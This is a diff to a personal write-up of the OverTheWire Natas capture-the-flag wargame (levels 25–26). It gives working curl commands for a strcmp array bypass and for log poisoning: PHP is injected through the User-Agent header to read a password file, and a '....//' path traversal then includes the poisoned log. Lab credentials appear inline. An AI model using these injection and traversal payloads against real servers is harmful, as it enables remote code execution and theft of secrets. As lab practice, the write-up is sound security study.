@@ -193,8 +193,9 @@ when an array camein like `?password[]=`\
 it returns a error, false\
 but `if(!strcmp($_REQUEST["passwd"],"<censored>"))` returns a true\
 
-#### l26.
+#### l26.3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
 this level's security alarm collect un-filtered user-agent\
-`curl -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -A "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" -c cookie.txt "http://natas25.natas.labs.overthewire.org/index.php?lang=en"`
-to inject embedded php\
-use same cookie to access it to make server run it(theorologically)
+`curl -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -A "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>" -c cookie.txt "http://natas25.natas.labs.overthewire.org/index.php?lang=../"`
+to inject embedded php by trigger request\
+use same cookie to access it to make server run it\
+`curl -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -b cookie.txt "http://natas25.natas.labs.overthewire.org/index.php?lang=....//logs/natas25_session.log`\
